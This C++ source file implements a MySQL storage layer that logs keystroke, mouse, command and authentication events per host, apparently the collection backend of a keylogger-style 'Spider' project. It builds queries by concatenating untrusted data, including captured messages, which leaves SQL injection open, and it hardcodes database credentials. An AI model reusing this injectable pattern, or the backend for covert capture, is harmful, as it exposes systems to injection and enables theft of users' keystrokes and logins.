#include "DataManagement.hpp"

DataManagement::DataManagement()
{
  sqlObj = mysql_init(NULL);
  if (sqlObj == NULL)
    fprintf(stderr, "%s\n", mysql_error(sqlObj));
}

int   DataManagement::CreateDB(const std::string &name)
{
  std::string tmp;

  tmp = "CREATE DATABASE " + name;
  if (mysql_query(sqlObj, tmp.c_str()))
  {
      fprintf(stderr, "%s\n", mysql_error(sqlObj));
      return (-1);
  }
  nameDB = name;
  return (0);
}

int   DataManagement::Connect(const std::string &login, const std::string &pswd, const char *db)
{
  if (mysql_real_connect(sqlObj, "localhost", login.c_str(), pswd.c_str(),
          db, 0, NULL, 0) == NULL)
  {
      fprintf(stderr, "CONNECT %s\n", mysql_error(sqlObj));
      return (-1);
  }
  return (0);
}

int   DataManagement::CreateUserDb(const std::string &login, const std::string &pswd,
                 const std::string &db_name)
{
  std::string   tmp;

  nameDB = db_name;
  tmp = "CREATE USER " + login + "@localhost IDENTIFIED BY '" + pswd + "';";
  Query(tmp.c_str());
  tmp = "GRANT ALL ON " + nameDB + ".* to " + login + "@localhost;";
  Query(tmp.c_str());
  return (0);
}

int   DataManagement::Query(const std::string &query)
{
  if (mysql_query(sqlObj, query.c_str()))
  {
      fprintf(stderr, "%s\n", mysql_error(sqlObj));
      return (-1);
  }
  return (0);
}

MYSQL_RES *DataManagement::retQuery(const std::string &query)
{
  MYSQL_RES *res;

  if (mysql_query(sqlObj, query.c_str()))
  {
      fprintf(stderr, "%s\n", mysql_error(sqlObj));
      return (NULL);
  }
  res = mysql_use_result(sqlObj);
  return (res);
}

void   DataManagement::CreateTable(const std::string &name, const std::string &param)
{
  Query("DROP TABLE IF EXISTS " + name);
  Query("CREATE TABLE " + name + param);
}

void  DataManagement::AddDataToTable(const std::string &name, const std::string &param)
{
  Query("INSERT INTO " + name + " VALUES" + param);
}

void  DataManagement::CloseConnection()
{
  mysql_close(sqlObj);
}

int   DataManagement::Installation()
{
  PObj.ScanPswd();
  if (Connect("root", PObj.getPswd(), NULL) == -1)
    return (-1);
  CreateDB("SpiderDB");
  CreateUserDb("SpiderUser", "Spider", "SpiderDB");
  Query("USE SpiderDB");
  InitTable();
  CloseConnection();
  return (0);
}

int  DataManagement::InitTable()
{
  CreateTable("User", "(id INT UNSIGNED NOT NULL AUTO_INCREMENT, hid INT UNSIGNED NOT NULL, PRIMARY KEY (id))");
  CreateTable("Message", "(timestamp INT UNSIGNED NOT NULL, type TINYINT UNSIGNED NOT NULL, data TEXT NOT NULL, id INT UNSIGNED NOT NULL)");
  CreateTable("Type_event", "(id TINYINT UNSIGNED NOT NULL, name VARCHAR(35) NOT NULL)");

  AddDataToTable("Type_event", "(0, 'KEYSTROKE')");
  AddDataToTable("Type_event", "(1, 'MOUSE')");
  AddDataToTable("Type_event", "(2, 'COMMAND')");
  AddDataToTable("Type_event", "(3, 'RESPONSE')");
  AddDataToTable("Type_event", "(4, 'AUTH')");
  return (0);
}

std::string  DataManagement::NewUser(std::string hid)
{
  MYSQL_RES *ret;
  MYSQL_ROW row;
  std::string id;

  AddDataToTable("User", "(NULL, '" + hid + "')");
  ret = retQuery("SELECT id FROM User WHERE hid = " + hid);
  if ((row = mysql_fetch_row(ret)))
    id = row[0];
  mysql_free_result(ret);
  return (id);
}

int  DataManagement::AddMessage(std::string from, std::string id, Data msg)
{
  std::string tmp;
  std::string data(msg.Data);

  tmp = "('";
  tmp += std::to_string(msg.Timestamp);
  tmp += "', " + std::to_string(msg.Type);
  tmp += ", '" + data + "', " + id + ")";
  AddDataToTable("Message", tmp);
  (void)from;
  return (0);
}

int  DataManagement::NewMessage(std::string from, Data msg)
{
  MYSQL_RES *ret;
  MYSQL_ROW row;
  std::string id = "-1";

  ret = retQuery("SELECT id FROM User WHERE hid = " + from);
  if ((row = mysql_fetch_row(ret)))
    id = row[0];
  mysql_free_result(ret);
  if (id == "-1")
    id = NewUser(from);
  AddMessage(from, id, msg);
  return (0);
}
